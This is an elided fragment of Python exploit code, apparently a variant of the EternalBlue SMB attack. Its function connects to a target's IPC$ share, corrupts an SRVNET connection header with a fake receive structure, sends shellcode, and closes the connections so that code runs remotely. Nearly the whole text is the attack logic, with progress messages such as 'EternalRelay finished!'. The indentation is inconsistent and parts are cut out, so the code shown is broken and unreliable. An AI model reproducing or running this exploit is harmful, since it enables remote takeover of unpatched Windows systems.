...
from eternalsmb import ETERNALSMB
...
def exploit(conn, target, shellcode, numGroomConn):

	tid = conn.tree_connect_andx('\\\\'+target+'\\'+'IPC$')
	print '[*] TreeConnectAndX to IPC$ successful!'
	...
	if retStatus == 0xc000000d:
	    print('[+] Received INVALID_PARAMETER!')
           	# one of srvnetConn struct header should be modified
        	# a corrupted buffer will write recv data in designed memory address
            print('[*] Searching for a modified srvnetConn header...')
            for sk in srvnetConn:
	        sk.send(fake_recv_struct + shellcode)

            print('[*] Closing SRVNET connections to trigger code execution...')
	    ...
	    conn.disconnect_tree(tid)
            ...
            print('[+] EternalRelay finished!')

            return

	else:

	    print('[-] Received a bad response status: 0x{:08x}'.format(retStatus))
